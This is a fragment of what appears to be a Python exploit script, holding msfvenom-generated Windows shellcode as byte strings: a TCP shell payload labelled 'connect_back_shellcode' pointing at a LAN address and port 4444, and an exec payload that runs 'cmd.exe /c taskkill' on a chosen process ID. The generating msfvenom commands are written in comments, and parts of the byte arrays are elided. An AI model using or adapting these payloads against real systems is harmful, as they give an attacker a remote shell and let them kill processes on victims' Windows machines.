...
# LHOST=192.168.86.129 LPORT=4444 EXITFUNC=thread msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -b
# '\x00' -e None -f python LHOST=192.168.86.129 LPORT=4444 EXITFUNC=thread for no encoding
connect_back_shellcode = \
    ...
    "\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a\x02\x68" \
    "\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89" \
    "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85" \
    "\xc0\x75\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68" \
    "\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61" \
    "\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f" \
    "\xff\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00" \
...
# msfvenom --platform Windows -p windows/exec  -f python CMD="cmd.exe /c taskkill /PID AAAAAAAA" EXITFUNC=thread
process_killer_shellcode = \
    ...
    "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d" \
    "\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a" \
    "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53" \
    "\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20" \
    "\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44" \
    "\x20\x41\x41\x41\x41\x41\x41\x41\x41\x00"
